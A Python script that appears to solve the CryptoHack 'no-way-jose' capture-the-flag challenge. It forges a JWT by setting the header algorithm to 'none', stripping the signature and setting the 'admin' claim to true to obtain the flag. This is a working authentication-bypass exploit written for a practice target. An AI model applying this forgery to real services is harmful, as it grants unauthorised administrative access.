import jwt
import requests
import json
import base64


def authorise(token):
    r = requests.get(f"https://web.cryptohack.org/no-way-jose/authorise/{token}/")
    return r.text


def create_session(username):
    r = requests.get(f"https://web.cryptohack.org/no-way-jose/create_session/{username}/")
    return r.text


data = create_session("nhat")
data = json.loads(data)
session = data["session"]
session = session.split('.')
alg = base64.b64decode((session[0] + "===").encode()).decode()
alg = json.loads(alg)
alg["alg"] = "none"
alg = json.dumps(alg).encode()
session[0] = base64.b64encode(alg).decode()
change = base64.b64decode((session[1] + "===").encode()).decode()
change = json.loads(change)
change['admin'] = True
change = json.dumps(change).encode()
session[1] = base64.b64encode(change).decode()
session = '.'.join(session)
flag = authorise(session)
print(flag)
